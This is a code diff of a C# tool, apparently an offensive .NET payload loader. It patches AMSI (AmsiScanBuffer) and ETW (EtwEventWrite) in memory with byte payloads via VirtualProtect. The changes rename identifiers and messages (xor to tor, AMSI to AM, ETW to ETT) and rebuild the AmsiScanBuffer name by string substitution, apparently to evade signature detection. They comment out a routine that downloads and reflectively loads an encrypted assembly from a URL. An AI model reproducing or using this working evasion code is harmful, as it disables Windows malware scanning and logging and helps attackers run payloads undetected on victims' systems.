@@ -118,7 +118,7 @@ namespace AnimalZoo
             Delegate funcDelegate = Marshal.GetDelegateForFunctionPointer(FunctionPointer, FunctionDelegateType);
             return funcDelegate.DynamicInvoke(Parameters);
         }
-        private static byte[] xor(byte[] inputData, string keyPhrase)
+        private static byte[] tor(byte[] inputData, string keyPhrase)
         {
             //byte[] keyBytes = Encoding.UTF8.GetBytes(keyPhrase);
             byte[] bufferBytes = new byte[inputData.Length];
@@ -163,8 +163,8 @@ namespace AnimalZoo
             string[] payloadArgs = new string[] { };
 
             bool base64Enc = false;
-            bool xorEnc = false;
-            string xorKey = "";
+            bool torEnc = false;
+            string torKey = "";
 
             int secProTypeHolde = (Convert.ToInt32("384") * Convert.ToInt32("8"));
             if (args.Length > 0)
@@ -180,21 +180,21 @@ namespace AnimalZoo
                     }
 
 
-                    if (argument.ToLower() == "-xor" || argument.ToLower() == "--xor")
+                    if (argument.ToLower() == "-tor" || argument.ToLower() == "--tor")
                     {
-                        xorEnc = true;
+                        torEnc = true;
 
                         int argData = Array.IndexOf(args, argument) + 1;
                         if (argData < args.Length)
                         {
                             string rawArg = args[argData];
                             if (base64Enc)
-                                xorKey = Encoding.UTF8.GetString(Convert.FromBase64String(rawArg));
+                                torKey = Encoding.UTF8.GetString(Convert.FromBase64String(rawArg));
                             else
-                                xorKey = rawArg;
+                                torKey = rawArg;
                         }
 
-                        Console.WriteLine("[+] Decrypting XOR encrypted binary using key '{0}'", xorKey);
+                        Console.WriteLine("[+] Decrypting XOR encrypted binary using key '{0}'", torKey);
                     }
 
 
@@ -241,7 +241,7 @@ namespace AnimalZoo
 
 
 
-                //TriggerPayload(payloadPathOrUrl, payloadArgs, xorEnc, xorKey, secProTypeHolde);
+                //TriggerPayload(payloadPathOrUrl, payloadArgs, torEnc, torKey, secProTypeHolde);
                 Environment.Exit(0);
 
 
@@ -252,59 +252,42 @@ namespace AnimalZoo
             */
         }
 
-        public static void PatchETW()
+        public static void PatchETT()
         {
             IntPtr pEtwEventSend = GetLibraryAddress("ntdll.dll", "EtwEventWrite");
             IntPtr pVirtualProtect = GetLibraryAddress("kErNEl32.dll", "VirtualProtect");
 
             VirtualProtect fVirtualProtect = (VirtualProtect)Marshal.GetDelegateForFunctionPointer(pVirtualProtect, typeof(VirtualProtect));
 
-            var patch = getETWPayload();
+            var patch = getETTPayload();
             uint oldProtect;
 
             if (fVirtualProtect(pEtwEventSend, (UIntPtr)patch.Length, 0x40, out oldProtect))
             {
                 Marshal.Copy(patch, 0, pEtwEventSend, patch.Length);
-                Console.WriteLine("[+] Successfully unhooked ETW!");
+                Console.WriteLine("[+] Successfully unhooked ETT!");
             }
 
 
         }
 
-        public static string parseStringConsoleInput(string inputData, bool base64Decode)
-        {
-            if (base64Decode)
-                inputData = Encoding.UTF8.GetString(Convert.FromBase64String(inputData));
-
-            if (inputData.Trim().ToLower().Equals("x"))
-                Environment.Exit(0);
-
-            return inputData;
-
-        }
-
-        private static bool parseBoolConsoleInput(ConsoleKey consoleKey)
-        {
-            if (consoleKey == ConsoleKey.X)
-                Environment.Exit(0);
-
-            return (consoleKey == ConsoleKey.Y);
-        }
-
+        /*
         private static void printHelp()
         {
             Console.WriteLine("Usage: ");
-            Console.WriteLine("Usage: [-b64] [-xor <key>] -path <binary_path> [-args <binary_args>]");
+            Console.WriteLine("Usage: [-b64] [-tor <key>] -path <binary_path> [-args <binary_args>]");
             Console.WriteLine("\t-b64: Optionnal flag parameter indicating that all other parameters are base64 encoded.");
-            Console.WriteLine("\t-xor: Optionnal parameter indicating that binary files are XOR encrypted. Must be followed by the XOR decryption key.");
+            Console.WriteLine("\t-tor: Optionnal parameter indicating that binary files are XOR encrypted. Must be followed by the XOR decryption key.");
             Console.WriteLine("\t-path: Mandatory parameter. Indicates the path, either local or a URL, of the binary to load.");
             Console.WriteLine("\t-args: Optionnal parameter used to pass arguments to the loaded binary. Must be followed by all arguments for the binary.");
         }
-
+        */
+        /*
         private static Assembly loadASM(byte[] byteArray)
         {
             return Assembly.Load(byteArray);
         }
+        */
 
         private static byte[] readLocalFilePath(string filePath, FileMode fileMode)
         {
@@ -317,7 +300,7 @@ namespace AnimalZoo
             return buffer;
 
         }
-        private static IntPtr getAMSILocation()
+        private static IntPtr getAMLocation()
         {
             //GetProcAddress
             IntPtr pGetProcAddress = GetLibraryAddress("kernel32.dll", "GetProcAddress");
@@ -326,9 +309,13 @@ namespace AnimalZoo
             GetProcAddress fGetProcAddress = (GetProcAddress)Marshal.GetDelegateForFunctionPointer(pGetProcAddress, typeof(GetProcAddress));
             LoadLibrary fLoadLibrary = (LoadLibrary)Marshal.GetDelegateForFunctionPointer(pLoadLibrary, typeof(LoadLibrary));
 
-            byte[] functionsig_bytes = Convert.FromBase64String("IkFtc2lTY2FuQnVmZmVyIiANCg==");
-            string functionname = System.Text.Encoding.UTF8.GetString(functionsig_bytes);
-            return fGetProcAddress(fLoadLibrary("aMSi.dll"), functionname);
+            //byte[] functionsig_bytes = Convert.FromBase64String("IkFtc2lTY2FuQnVmZmVyIiANCg==");
+            //Console.WriteLine(functionsig_bytes);
+            //string functionname = System.Text.Encoding.UTF8.GetString(functionsig_bytes);
+            string funcname = "AmTiSZanBuffer";
+            funcname = funcname.Replace("T", "s").Replace("Z", "c");
+            //Console.WriteLine(funcname);
+            return fGetProcAddress(fLoadLibrary("aMSi.dll"), funcname);
         }
 
         private static bool is64Bit()
@@ -340,14 +327,14 @@ namespace AnimalZoo
         }
 
 
-        private static byte[] getETWPayload()
+        private static byte[] getETTPayload()
         {
             if (!is64Bit())
                 return Convert.FromBase64String("whQA");
             return Convert.FromBase64String("ww==");
         }
 
-        private static byte[] getAMSIPayload()
+        private static byte[] getAMPayload()
         {
             if (!is64Bit())
                 return Convert.FromBase64String("uFcAB4DCGAA=");
@@ -382,55 +369,28 @@ namespace AnimalZoo
             ServicePointManager.SecurityProtocol = (SecurityProtocolType)secProt;
             return secProt;
         }
-        private static MethodInfo getEntryPoint(Assembly asm)
+
+        /*private static MethodInfo getEntryPoint(Assembly asm)
         {
             return asm.EntryPoint;
-        }
+        }*/
 
-        private static void TriggerPayload(string payloadPathOrURL, string[] inputArgs, bool xorEncoded, string xorKey, int setProtType = 0)
-        {
-            setProtocolTLS(setProtType);
-
-            if (!string.IsNullOrEmpty(string.Join(" ", inputArgs)))
-                Console.WriteLine("[+] URL/PATH : " + payloadPathOrURL + " Arguments : " + string.Join(" ", inputArgs));
-            else
-            {
-                Console.WriteLine("[+] URL/PATH : " + payloadPathOrURL + " Arguments : " + string.Join(" ", inputArgs));
-            }
-            globalArgs = new object[] { inputArgs };
-
-            if (xorEncoded && payloadPathOrURL.ToLower().StartsWith("http"))
-            {
-
-                encDeploy(downloadURL(payloadPathOrURL), xorKey);
-            }
-            else if (!xorEncoded && payloadPathOrURL.ToLower().StartsWith("http"))
-            {
-
-                unEncDeploy(downloadURL(payloadPathOrURL));
-            }
-            else if (!xorEncoded && !payloadPathOrURL.ToLower().StartsWith("http"))
-                unEncDeploy(readLocalFilePath(payloadPathOrURL, FileMode.Open));
-            else
-                encDeploy(readLocalFilePath(payloadPathOrURL, FileMode.Open), xorKey);
-
-        }
-
-        private static void encDeploy(byte[] data, string xorKey)
+        /*
+        private static void denk(byte[] data, string torKey)
         {
 
-            invokeCSharpMethod(getEntryPoint(loadASM(xor(data, xorKey))));
+            invokeCSharpMethod(getEntryPoint(loadASM(tor(data, torKey))));
 
         }
 
-        private static void unEncDeploy(byte[] data)
+        private static void frenk(byte[] data)
         {
 
             invokeCSharpMethod(getEntryPoint(loadASM(data)));
 
         }
-
-        private static IntPtr unProtect(IntPtr amsiLibPtr)
+        */
+        private static IntPtr protect(IntPtr amLibPtr)
         {
 
             IntPtr pVirtualProtect = GetLibraryAddress("kErNEl32.dll", "VirtualProtect");
@@ -438,9 +398,9 @@ namespace AnimalZoo
             VirtualProtect fVirtualProtect = (VirtualProtect)Marshal.GetDelegateForFunctionPointer(pVirtualProtect, typeof(VirtualProtect));
 
             uint newMemSpaceProtection = 0;
-            if (fVirtualProtect(amsiLibPtr, (UIntPtr)getAMSIPayload().Length, 0x40, out newMemSpaceProtection))
+            if (fVirtualProtect(amLibPtr, (UIntPtr)getAMPayload().Length, 0x40, out newMemSpaceProtection))
             {
-                return amsiLibPtr;
+                return amLibPtr;
             }
             else
             {
@@ -448,17 +408,17 @@ namespace AnimalZoo
             }
 
         }
-        public static void PatchAMSI()
+        public static void PatchAM()
         {
-            IntPtr amsiLibPtr = unProtect(getAMSILocation());
-            if (amsiLibPtr != (IntPtr)0)
+            IntPtr amLibPtr = protect(getAMLocation());
+            if (amLibPtr != (IntPtr)0)
             {
-                Marshal.Copy(getAMSIPayload(), 0, amsiLibPtr, getAMSIPayload().Length);
-                Console.WriteLine("[+] Successfully patched amsI");
+                Marshal.Copy(getAMPayload(), 0, amLibPtr, getAMPayload().Length);
+                Console.WriteLine("[+] Successfully patched ams");
             }
             else
             {
-                Console.WriteLine("[!] Patching amsI FAILED");
+                Console.WriteLine("[!] Patching ams FAILED");
             }
 
         }
